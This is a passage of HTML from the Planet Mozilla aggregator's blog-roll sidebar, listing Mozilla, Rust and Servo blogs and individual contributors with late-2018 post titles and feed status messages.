href="https://blog.mozilla.org/" title="The Mozilla Blog" class="active">The Mozilla Blog</a><ul><li><a href="https://blog.mozilla.org/blog/2018/12/20/latest-firefox-focus-provides-more-user-control/">Latest Firefox Focus provides more user control</a></li><li><a href="https://blog.mozilla.org/blog/2018/12/20/create-test-innovate-repeat/">Create, test, innovate, repeat.</a></li><li><a href="https://blog.mozilla.org/blog/2018/12/11/latest-firefox-release-available-today/">Latest Firefox Release Available Today</a></li><li><a href="https://blog.mozilla.org/blog/2018/12/06/goodbye-edge/">Goodbye, EdgeHTML</a></li></ul></li><li><a title="subscribe" href="https://blog.rust-lang.org/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.rust-lang.org/" title="Rust Blog" class="active">The Rust Programming Language Blog</a><ul><li><a href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html">Procedural Macros in Rust 2018</a></li><li><a href="https://blog.rust-lang.org/2018/12/20/Rust-1.31.1.html">Announcing Rust 1.31.1</a></li><li><a href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html">Tools in the 2018 edition</a></li><li><a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">A call for Rust 2019 Roadmap blog posts</a></li><li><a href="https://blog.rust-lang.org/2018/12/06/Rust-1.31-and-rust-2018.html">Announcing Rust 1.31 and Rust 2018</a></li><li><a href="https://blog.rust-lang.org/2018/11/29/a-new-look-for-rust-lang-org.html">A new look for rust-lang.org</a></li></ul></li><li><a title="subscribe" href="https://blog.servo.org/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.servo.org/" title="Servo Blog" class="active">The Servo Blog</a><ul><li><a href="https://blog.servo.org/2018/12/17/twis-121/">This Week In Servo 121</a></li><li><a href="https://blog.servo.org/2018/12/04/magicleap/">Experience porting Servo to the Magic Leap One</a></li><li><a href="https://blog.servo.org/2018/12/03/twis-120/">This Week In Servo 120</a></li></ul></li><li><a title="subscribe" href="https://this-week-in-rust.org/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://this-week-in-rust.org/" title="This Week in Rust" class="active">This Week In Rust</a><ul><li><a href="https://this-week-in-rust.org/blog/2018/12/25/this-week-in-rust-266/">This Week in Rust 266</a></li><li><a href="https://this-week-in-rust.org/blog/2018/12/18/this-week-in-rust-265/">This Week in Rust 265</a></li><li><a href="https://this-week-in-rust.org/blog/2018/12/11/this-week-in-rust-264/">This Week in Rust 264</a></li><li><a href="https://this-week-in-rust.org/blog/2018/12/04/this-week-in-rust-263/">This Week in Rust 263</a></li></ul></li><li><a title="subscribe" href="https://blog.mozilla.org/thunderbird/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/thunderbird/feed/" class="message" title="no activity in 90 days">Thunderbird Blog</a></li><li><a title="subscribe" href="http://theochevalier.fr/rss/mozilla_en.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="internal server error">Th√©o Chevalier</a></li><li><a title="subscribe" href="https://blog.timc.idv.tw/posts/tag/planet-mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.timc.idv.tw/" class="message" title="no activity in 90 days">Tim Guan-tin Chien</a></li><li><a title="subscribe" href="http://timtaubert.de/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://timtaubert.de/" class="message" title="no activity in 90 days">Tim Taubert</a></li><li><a title="subscribe" href="http://tomfarrow.info/?cat=9&amp;feed=rss2"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="internal server error">Tom Farrow</a></li><li><a title="subscribe" href="http://javascript-reverse.tumblr.com/tagged/mozilla/rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://javascript-reverse.tumblr.com/" class="message" title="no activity in 90 days">Tom Schuster</a></li><li><a title="subscribe" href="https://tylerdowner.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://tylerdowner.wordpress.com/" class="message" title="no activity in 90 days">Tyler Downer</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Wes Kocher</a></li><li><a title="subscribe" href="http://micropipes.com/blog//mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://micropipes.com/blog//" class="message" title="no activity in 90 days">Wil Clouser</a></li><li><a title="subscribe" href="http://bluesock.org/~willg/blog/index.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://bluesock.org/~willkg/blog/" title="Will's blog" class="active">Will Kahn-Greene</a><ul><li><a href="https://bluesock.org/~willkg/blog/mozilla/socorro_python3.html">Socorro: migrating to Python 3</a></li><li><a href="https://bluesock.org/~willkg/blog/mozilla/socorro_2018_11.html">Socorro: November 2018 happenings</a></li></ul></li><li><a title="subscribe" href="https://wlach.github.io/feeds/Mozilla.rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://wlach.github.io/tags/Mozilla.html" title="William Lachance's Log: Posts tagged 'Mozilla'">William Lachance</a></li><li><a title="subscribe" href="http://somethin-else.org/index.php?feed/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.somethin-else.org/feed/" class="message" title="no activity in 90 days">William Quiviger</a></li><li><a title="subscribe" href="https://palant.de/atom/?category=mozilla%2Cgecko%2Csecurity"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://palant.de/" title="Wladimir Palant's notes - mozilla - gecko - security" class="active">Wladimir Palant</a><ul><li><a href="https://palant.de/2018/12/17/bbn-challenge-resolution-getting-the-flag-from-a-browser-extension">BBN challenge resolution: Getting the flag from a browser extension</a></li><li><a href="https://palant.de/2018/12/10/if-your-bug-bounty-program-is-private-why-do-you-have-it">If your bug bounty program is private, why do you have it?</a></li><li><a href="https://palant.de/2018/12/10/bbn-challenge-resolution-exploiting-the-screenshotterpro-browser-extension">BBN challenge resolution: Exploiting the Screenshotter.PRO browser extension</a></li><li><a href="https://palant.de/2018/11/30/maximizing-password-manager-attack-surface-leaning-from-kaspersky">Maximizing password manager attack surface: Learning from Kaspersky</a></li></ul></li><li><a title="subscribe" href="http://feeds.feedburner.com/yura-zenevich"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://yzen.github.io/" class="message" title="no activity in 90 days">Yura Zenevich</a></li><li><a title="subscribe" href="https://diary.braniecki.net/tag/planetmo/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://diary.braniecki.net/" title="planet.m.o ‚Äì stream of bytes">Zibi Braniecki</a></li></ul><div class="bottom"></div></div></div><div id="footer"><div id="footer-content"><p>Maintained by the <a href="https://bugzilla.mozilla.org/enter_bug.cgi?product=Websites&amp;component=planet.mozilla.org">Planet Mozilla Module Team</a>. Powered by <a href="http://www.intertwingly.net/code/venus/">Planet Venus</a>. View our <a href="http://www.mozilla.org/about/policies/privacy-policy.html">Privacy Policy</a>.</p></div></div></body>
</html>
